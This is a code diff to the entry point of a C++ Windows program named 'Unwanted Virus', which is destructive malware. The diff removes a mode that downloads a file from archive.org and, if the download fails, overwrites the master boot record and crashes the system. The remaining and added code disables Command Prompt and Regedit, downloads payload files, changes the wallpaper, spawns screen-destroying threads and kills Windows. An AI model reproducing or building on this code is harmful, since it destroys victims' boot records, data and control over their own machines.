@@ -60,10 +60,6 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
     int argc;
     LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
     if (argc > 1) {    
-        if (!lstrcmpW(argv[1], L"testreg")) {
-            testreg();
-            return 0;
-        }
         if (!lstrcmpW(argv[1], L"gdi1")) {
             CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
             MessageBox(
@@ -116,52 +112,6 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
             CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
             CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
         }
-        if (!lstrcmpW(argv[1], L"startmalwarewithlog"))
-        {
-            MessageBox(NULL, L"Sorry but this mode was only avaliable when this program was developed and when was a CLI program, now this is a WUI program and this is not avaliable, also why a malware just have a log?", L"Log mode", MB_ICONINFORMATION | MB_OK);
-            goto warning;
-            /*
-            SetConsoleTitle(TEXT("Unwanted Virus Console Window"));
-            system("cls");
-            NoUnwanted1();
-            cout << "Unwanted Virus Console Versión [2.0.666.0]\n";
-            cout << "(c) BenjaminFretez. Todos los derechos reservados.\n\n";
-            cout << "This malware is not ready for be used on this mode, are u sure to continue?[y/n]\n";
-            cout << "[ Input ] > ";
-
-            int DisplayResourceNameMessageBox();
-            {
-                int startmsg = MessageBox(
-                    NULL,
-                    (LPCWSTR)L"Are you sure to run this program?", // Warning message box
-                    (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
-                    MB_ICONWARNING | MB_YESNO
-                );
-
-                switch (startmsg)
-                {
-                case IDYES:
-                    cout << "Y"; Sleep(100); cout << "e"; Sleep(100); cout << "s"; Sleep(100); cout << "  "; Sleep(100); cout << "=";  Sleep(100); cout << ")"; Sleep(100);
-                    cout << "\n\n";
-                    Sleep(200);
-                    goto malware; // run malware
-                case IDNO:
-                    cout << "N"; Sleep(100); cout << "o"; Sleep(100);
-                    cout << "\n\n";
-                    Sleep(200);
-                    int startmsg = MessageBox(
-                        NULL,
-                        (LPCWSTR)L"OK, you missed the fun...",
-                        (LPCWSTR)L"Úñåáñþéð ß¾®ü’",
-                        MB_ICONINFORMATION | MB_OK
-                    );
-                    NoUnwanted0();
-                    break;
-                }
-                return startmsg;
-            }*/
-
-        }
         if (!lstrcmpW(argv[1], L"startonlymsgbox")) {
             ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
 
@@ -213,89 +163,14 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
             return 0;
         }
         if (!lstrcmpW(argv[1], L"/about")) {
-            cout << "Unwanted Virus\n\nCreator: BenjaminFretez\nLanguage: C++\nVersión: 2.0.666.0";
             int startmsg = MessageBox(
                 NULL,
-                (LPCWSTR)L"Unwanted Virus\n\nCreator: BenjaminFretez\nLanguage: C++\nVersión: 3.0.666.0", // about msgbox
+                (LPCWSTR)L"Unwanted Virus\n\nCreator: bn\nLanguage: C++\nVersión:", // about msgbox
                 (LPCWSTR)L"About Unwanted Virus",
                 MB_ICONINFORMATION | MB_OK
             );
             return 0;
-        }        
-        if (!lstrcmpW(argv[1], L"see-iam-alone")) {
-            ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
-            Sleep(300);
-            const wchar_t* UGOTROLLEDL = L"http://archive.org/download/01101000/0000004.bin";
-            const wchar_t* UGOTROLLEDD = L"C:\\Program Files\\Common Files\\system\\ugottrolledhaha.png";
-            if (S_OK == URLDownloadToFile(NULL, UGOTROLLEDL, UGOTROLLEDD, 0, NULL)) {
-                // success
-            }
-            else // else kills os
-            {
-                CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
-                int DisplayResourceNAMessageBox();
-                {
-                    int msgboxID = MessageBox(
-                        NULL,
-                        (LPCWSTR)L"Unknown hard error",
-                        (LPCWSTR)L"Unwanted.exe - System Warning",
-                        MB_ICONWARNING | MB_OK
-                    );
-                };
-                int argc;
-                LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-                if (argc > 1) {
-                    if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
-
-                    }
-                    else
-                    {
-                        DestroyMBR();
-                    }
-                }
-                else
-                {
-                    DestroyMBR();
-                }
-
-                CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
-                CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
-                Sleep(200);
-                CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
-
-                Sleep(992);
-
-                StartFuckingPC();
-                DisablePowerOptions();
-            };
-
-            HANDLE ESCAPE = CreateFileA("C:\\The Escape is behind you", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-
-            WriteFile(ESCAPE, escapem, escape_len, &wb, NULL);
-
-            CloseHandle(ESCAPE);
-
-
-            ShellExecuteA(NULL, NULL, "notepad", "C:\\The Escape is behind you", NULL, SW_SHOWDEFAULT);
-
-            Sleep(5000);
-
-            const wchar_t* filenm = L"C:\\Program Files\\Common Files\\system\\ugottrolledhaha.png";
-            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
-
-            CreateThread(NULL, NULL, &payloadThread, &Tada, NULL, NULL);
-
-            int msgboxID = MessageBox(
-                NULL,
-                (LPCWSTR)L"U GOT TROLLED HAHAHA",
-                (LPCWSTR)L"HAHAHAHAHAAHAHAHAH",
-                NULL | MB_OK
-            );
-
-            Sleep(10000);
-
-            return 0;
-        } 
+        }
         if (!lstrcmpW(argv[1], L"/nowarning")) {
             ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide the console window
             goto malware; // Skips the Warning
@@ -525,7 +400,7 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
         Sleep(200); // Waits 200 Miliseconds       
         DisableCMD(); // Disable Command Prompt
         DisableRegistryTools(); // Disable Regedit
-        Sleep(2000); // Sleep 2 seconds
+        Sleep(15000); // Sleep 2 seconds
         
 
         DownloadFiles:
@@ -536,11 +411,12 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
 		// srcURL8 = paynt.rtf
 
         CreateDataFiles(); // Create notepads
-        CreateDesktopFiles(); // Create Desktop Files
+        // CreateDesktopFiles(); // Create Desktop Files
+        CreateThread(NULL, NULL, &payloadThread, &CreateDesktopFiles, NULL, NULL);
         
         if (not(S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL))) UnknownHradError();
 
-        /* The part of downloading required files */
+        // Download the wallpaper and set it
         if (S_OK == URLDownloadToFile(NULL, srcURL1, destFile1, 0, NULL))
         {
             Sleep(1000);
@@ -548,8 +424,8 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
             // success
         }
-        // else kills os
-        else UnknownHradError(); 
+        else UnknownHradError();
+
 
 		if (not(S_OK == URLDownloadToFile(NULL, srcURL8, destFile8, 0, NULL))) UnknownHradError();
 
@@ -557,6 +433,8 @@ int __stdcall WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmd
         SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (void*)filenm, SPIF_UPDATEINIFILE);
 
         if (not(S_OK == URLDownloadToFile(NULL, srcURLk, destFilek, 0, NULL))) UnknownHradError();
+
+		Sleep(8000); // Wait 8 seconds
 
         // Open Notepad with the note
         ShellExecuteA(NULL, NULL, "notepad.exe", "C:\\note.txt", NULL, SW_SHOW);
